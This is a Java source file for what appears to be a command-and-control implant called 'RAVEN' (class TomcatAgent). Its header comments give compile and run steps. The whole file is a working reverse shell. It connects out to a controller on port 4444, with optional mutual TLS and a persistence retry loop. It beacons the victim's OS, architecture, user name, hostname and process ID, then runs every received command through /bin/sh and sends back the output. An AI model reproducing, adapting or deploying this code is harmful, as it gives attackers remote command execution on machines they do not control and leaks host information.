// RAVEN — Java Agent
// ID      : agent-006
// Server  : 0.0.0.0:4444
// mTLS    : false
// Persist : false
//
// Compile : javac TomcatAgent.java
// Run     : java TomcatAgent
// mTLS run: java -cp . TomcatAgent  (needs agent.p12 + ca.p12 in same dir)

import java.io.*;
import java.net.*;
import java.security.KeyStore;
import javax.net.ssl.*;

public class TomcatAgent {
    static final String  HOST    = "0.0.0.0";
    static final int     PORT    = 4444;
    static final boolean MTLS    = false;
    static final boolean PERSIST = false;
    static final String  KS_PASS = "tomcat";
    static final String  AGENT_ID = "agent-006";

    public static void main(String[] A) throws Exception {
        do {
            try { connect(); }
            catch (Exception E) {
                System.err.println("[-] Retry in 5s: " + E.getMessage());
                Thread.sleep(5000);
            }
        } while (PERSIST);
    }

    static void connect() throws Exception {
        Socket S;
        if (MTLS) {
            KeyStore Ks = KeyStore.getInstance("PKCS12");
            Ks.load(new FileInputStream("agent.p12"), KS_PASS.toCharArray());
            KeyStore Ts = KeyStore.getInstance("PKCS12");
            Ts.load(new FileInputStream("ca.p12"), KS_PASS.toCharArray());
            KeyManagerFactory   Km = KeyManagerFactory.getInstance("SunX509");
            TrustManagerFactory Tm = TrustManagerFactory.getInstance("SunX509");
            Km.init(Ks, KS_PASS.toCharArray());
            Tm.init(Ts);
            SSLContext Ctx = SSLContext.getInstance("TLS");
            Ctx.init(Km.getKeyManagers(), Tm.getTrustManagers(), null);
            S = Ctx.getSocketFactory().createSocket(HOST, PORT);
        } else {
            S = new Socket(HOST, PORT);
        }
        try {
            InputStream  In  = S.getInputStream();
            OutputStream Out = S.getOutputStream();
            // Beacon
            String Beacon = "{\"Type\":\"TOMCAT\",\"ID\":\"" + AGENT_ID
                + "\",\"OS\":\""   + System.getProperty("os.name")
                + "\",\"Arch\":\"" + System.getProperty("os.arch")
                + "\",\"User\":\"" + System.getProperty("user.name")
                + "\",\"Hostname\":\"" + InetAddress.getLocalHost().getHostName()
                + "\",\"Pid\":\"" + ProcessHandle.current().pid()
                + "\"}\n";
            Out.write(Beacon.getBytes("UTF-8"));
            Out.flush();
            BufferedReader R = new BufferedReader(new InputStreamReader(In,  "UTF-8"));
            PrintStream   P = new PrintStream(Out, true, "UTF-8");
            String Cmd;
            while ((Cmd = R.readLine()) != null) {
                Cmd = Cmd.trim();
                if (Cmd.isEmpty()) continue;
                if (Cmd.equalsIgnoreCase("exit") || Cmd.equalsIgnoreCase("quit")) break;
                try {
                    Process Proc = Runtime.getRuntime().exec(
                        new String[]{ "/bin/sh", "-c", Cmd });
                    byte[] Stdout = Proc.getInputStream().readAllBytes();
                    byte[] Stderr = Proc.getErrorStream().readAllBytes();
                    byte[] Out2 = Stdout.length > 0 ? Stdout : Stderr;
                    P.print(new String(Out2, "UTF-8"));
                    P.print("\u0000");
                    P.flush();
                } catch (Exception Ex) {
                    P.print("ERROR: " + Ex.getMessage() + "\u0000");
                    P.flush();
                }
            }
        } finally {
            try { S.close(); } catch (Exception Ign) {}
        }
    }
}